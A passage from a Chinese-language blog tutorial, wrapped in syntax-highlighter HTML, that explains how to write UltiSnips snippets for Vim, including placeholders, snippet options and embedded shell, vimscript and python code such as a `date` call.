-webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67066707a092487171-1\"><span class=\"crayon-p\"># 1 表示支持</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67066707a092487171-2\"><span class=\"crayon-o\">:</span><span class=\"crayon-e\">echo </span><span class=\"crayon-e\">has</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"python\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab67066707a092487171-3\"><span class=\"crayon-o\">:</span><span class=\"crayon-e\">echo </span><span class=\"crayon-e\">has</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"python3\"</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h2 id=\"定义一个代码片段\">定义一个代码片段</h2>\n<h3 id=\"定义格式\">定义格式</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67066707e647995025\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsnippet 触发字符 [\"代码片段说明\" [参数]]\r\n代码片段内容\r\nendsnippet</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67066707e647995025-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67066707e647995025-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67066707e647995025-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67066707e647995025-1\"><span class=\"crayon-i\">snippet</span><span class=\"crayon-h\"> </span>触发字符<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">\"代码片段说明\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span>参数<span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67066707e647995025-2\">代码片段内容</div><div class=\"crayon-line\" id=\"crayon-5bab67066707e647995025-3\"><span class=\"crayon-v\">endsnippet</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h3 id=\"最小化的一个代码片段\">最小化的一个代码片段</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670667082606648340\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsnippet if \"if (condition) { ... }\"\r\nif (${1:true}) {\r\n    $0\r\n}\r\nendsnippet</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670667082606648340-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670667082606648340-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670667082606648340-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670667082606648340-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670667082606648340-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670667082606648340-1\"><span class=\"crayon-e\">snippet </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"if (condition) { ... }\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670667082606648340-2\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670667082606648340-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670667082606648340-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670667082606648340-5\"><span class=\"crayon-v\">endsnippet</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这时当你在 vim 中输入 if 敲 tab 就会展开一条 if 语句，第一个触发点是 if 条件表达式，最后一个是 if 语句体</p>\n<p><code>${1:true}</code> 表示这是第一个触发点，占位符为 <code>true</code>，如果占位符没有默认值可直接使用 <code>$1</code>, <code>$2</code>, <code>$3</code>…</p>\n<h2 id=\"可视选择区的内容为占位符\">可视选择区的内容为占位符</h2>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670667085785917614\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsnippet if \"if (...)\"\r\nif (${1:true}) {\r\n    ${VISUAL}\r\n}\r\nendsnippet</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670667085785917614-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670667085785917614-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670667085785917614-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670667085785917614-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670667085785917614-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670667085785917614-1\"><span class=\"crayon-e\">snippet </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"if (...)\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670667085785917614-2\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670667085785917614-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">VISUAL</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670667085785917614-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670667085785917614-5\"><span class=\"crayon-v\">endsnippet</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p><code>${VISUAL}</code> 表示在 vim 中使用可视模式下选择的文本，这个在重构代码的时候<strong>非常有用</strong>（<a href=\"https://keelii.com/2018/08/26/vim-plugin-ultisnips-advanced-tips/\">后面会有高级用法</a>），上个图感受一下：</p>\n<p><img src=\"//img10.360buyimg.com/devfe/jfs/t25252/299/1019207883/36468/bca93de/5b84a8a9N8dd5a8c5.gif\" alt=\"if-with-visual-mode\"></p>\n<h2 id=\"代码片段的参数\">代码片段的参数</h2>\n<ul>\n<li><code>b</code> 表示触发字符应该在一行的开始</li>\n<li><code>i</code> 表示触发字符可以在单词内（连续展示会使用这个选项）</li>\n<li><code>w</code> 表示触发字符的前后必须是一个字母分界点</li>\n<li><code>r</code> 表示触发字符可以是一个正则表达式</li>\n<li><code>t</code> 表示展开的代码片段中如果有制表符，原样输出，即使你的 vimrc 里面设置了 expandtab</li>\n<li><code>m</code> 表示删除代码片段右边的所有空白字符</li>\n<li><code>e</code> 表示自定义上下文</li>\n<li><code>A</code> 表示自动触发，不需要按 tab，类似于 VIM 中的 abbr</li>\n</ul>\n<h2 id=\"内容解释器\">内容解释器</h2>\n<p>Ultisnips 定义的代码片段中支持三种不同的语言注入：shell, vimscript, python，在代码片段中用反引号表示</p>\n<h2 id=\"shell-代码\">shell 代码</h2>\n<p>就是在你的命令行 shell 能执行的代码片段，比如输出当前时间</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670667089027110269\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n➜ date\r\n2018年 8月27日 星期一 18时19分38秒 CST</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670667089027110269-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670667089027110269-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670667089027110269-1\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-i\">date</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670667089027110269-2\"><span class=\"crayon-cn\">2018</span>年<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span>月<span class=\"crayon-cn\">27</span>日<span class=\"crayon-h\"> </span>星期一<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span>时<span class=\"crayon-cn\">19</span>分<span class=\"crayon-cn\">38</span>秒<span class=\"crayon-h\"> </span><span class=\"crayon-v\">CST</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>在代码片段中用反引号「`」引用即可</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67066708c167263681\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsnippet today\r\nToday is the `date`.\r\nendsnippet</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67066708c167263681-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67066708c167263681-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67066708c167263681-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67066708c167263681-1\"><span class=\"crayon-e\">snippet </span><span class=\"crayon-e\">today</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67066708c167263681-2\"><span class=\"crayon-e\">Today </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">the</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">date</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab67066708c167263681-3\"><span class=\"crayon-v\">endsnippet</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>输入 today 按 tab 展开后（格式和上面shell中的不一样，估计是因为 vim 语言设置的问题）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670667090230618040\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nToday is the Mon Aug 27 18:24:51 CST 2018.</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670667090230618040-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670667090230618040-1\"><span class=\"crayon-e\">Today </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">Mon </span><span class=\"crayon-i\">Aug</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">27</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">24</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">51</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">CST</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h3 id=\"vimscript-代码\">vimscript 代码</h3>\n<p>使用 <code>indent</code> 来输出当前缩进值，使用前缀 <code>!v</code> 表示是 vimscript</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670667093340782058\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsnippet indent\r\nIndent is: `!v indent(\".\")`.\r\nendsnippet</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670667093340782058-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670667093340782058-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670667093340782058-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670667093340782058-1\"><span class=\"crayon-e\">snippet </span><span class=\"crayon-e\">indent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670667093340782058-2\"><span class=\"crayon-e\">Indent </span><span class=\"crayon-st\">is</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-o\">!</span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">indent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\".\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670667093340782058-3\"><span class=\"crayon-v\">endsnippet</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p><img src=\"//img12.360buyimg.com/devfe/jfs/t23467/4/2565317844/22166/a39566b/5b84a97fNa6174311.gif\" alt=\"vimscript-indent-size\"></p>\n<h3 id=\"python-代码\">python 代码</h3>\n<p>在代码片段中解释执行 python 代码是 ultisnips 最强大的功能，以前缀 <code>!p</code> 开始。系统会向 python 中注入一些变量，可以使用 python 代码直接对其进行操作</p>\n<ul>\n<li><code>fn</code> – 表示当前文件名</li>\n<li><code>path</code> – 当前文件名的路径</li>\n<li><code>t</code> – 占位符的字典，可以使用 <code>t[1], t[2], t.v</code> 来取占位符内容</li>\n<li><code>snip</code> – <a href=\"https://github.com/SirVer/ultisnips/blob/6fdc3647f72e0a1f321ea6bd092ecd01f7c187ba/pythonx/UltiSnips/text_objects/_python_code.py#L56\">UltiSnips.TextObjects.SnippetUtil</a> 对象的一个实例</li>\n<li><code>match</code> – 正则代码片段时返回的匹配元素（非常强大）</li>\n</ul>\n<p>其中最常用的 <code>snip</code> 